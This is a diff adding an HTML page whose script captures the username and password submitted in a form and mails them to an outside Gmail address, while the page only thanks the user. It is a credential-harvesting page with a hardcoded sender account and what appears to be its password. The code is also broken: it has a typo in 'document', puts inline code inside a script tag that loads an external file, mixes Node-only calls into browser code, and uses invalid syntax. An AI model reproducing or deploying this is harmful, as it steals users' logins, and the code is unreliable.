@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script src="https://smtpjs.com/v3/smtp.js">const formElement = documnt.getElementById('formElem'); // извлекаем элемент формы
+formElement.addEventListener('submit',
+    (e) => {
+        e.preventDefault();
+        const formData = new FormData(formElem); // создаём объект FormData, передаём в него элемент формы
+// теперь можно извлечь данные
+        const username = formData.get('username'); // 'John'
+        const password = formData.get('password'); // 'Smith'
+        const nodemailer = require('nodemailer')
+
+        let testEmailAccount = nodemailer.createTestAccount()
+
+        let transporter = nodemailer.createTransport({
+            host: 'smtp.gmail.com',
+            port: 587,
+            secure: false,
+            auth: {
+                user: testEmailAccount.mapatyxa@gmail.com,
+                pass: testEmailAccount.zhxrkmjpdyptuxpx,
+            },
+        })
+
+        let result = transporter.sendMail({
+            from: '"NoName" <mapatyxa@gmail.com>',
+            to: 'void666.developer@gmail.com',
+            subject: 'New user!',
+            text: 'His data:',
+            html:
+                'His data:', username , password,
+        })
+
+        console.log(result)
+    })</script>
+<h1>Thx for using!</h1>
+With &hearts; from SilentVoid!
+</body>
+</html>
